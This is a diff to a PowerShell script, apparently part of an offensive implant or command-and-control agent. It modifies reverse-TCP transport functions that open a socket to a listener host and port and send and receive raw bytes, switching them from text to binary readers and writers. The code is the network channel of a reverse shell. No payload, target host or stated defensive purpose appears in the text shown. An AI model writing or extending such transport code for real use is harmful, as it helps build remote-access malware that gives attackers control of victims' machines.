@@ -20,9 +20,8 @@ function Transport-ReverseTcp-Open {
 
     $tcpConnection = New-Object System.Net.Sockets.TcpClient($LHost, $LPort)
     $tcpStream = $tcpConnection.GetStream()
-    $reader = New-Object System.IO.StreamReader($tcpStream)
-    $writer = New-Object System.IO.StreamWriter($tcpStream)
-    $writer.AutoFlush = $true
+    $reader = New-Object System.IO.BinaryReader($tcpStream)
+    $writer = New-Object System.IO.BinaryWriter($tcpStream)
 
     return New-Object -TypeName PSObject -Property @{
        'tcpConnection' = $tcpConnection
@@ -40,23 +39,22 @@ function Transport-ReverseTcp-Close([PSObject] $obj) {
 }
 
 
-function Transport-ReverseTcp-Receive([PSObject] $obj, [Int32] $bytestoread) {
+function Transport-ReverseTcp-Receive([PSObject] $obj, [UInt32] $bytestoread) {
     #if ($obj.tcpConnection.Connected -and $obj.tcpStream.DataAvailable) {
 	$numb = 0
-	$buffer = New-Object char[]($bytestoread)
+	$buffer = New-Object byte[]($bytestoread)
 	while ($numb -lt $bytestoread) {
 		$numb += $obj.reader.Read($buffer, $numb, $bytestoread-$numb)
 	}
-	return [System.Text.Encoding]::UTF8.GetBytes($buffer)
+	return $buffer
     #} else {
     #    Write-Output "ERROR when receiving"
     #}
 }
 
 function Transport-ReverseTcp-Send([PSObject] $obj, [byte[]] $data) {
-    $senddata = [System.Text.Encoding]::UTF8.GetString($data).ToCharArray()
     if ($obj.tcpConnection.Connected) {
-        $obj.writer.Write($senddata)
+        $obj.writer.Write($data)
     } else {
         Write-Output "ERROR when sending"
     }
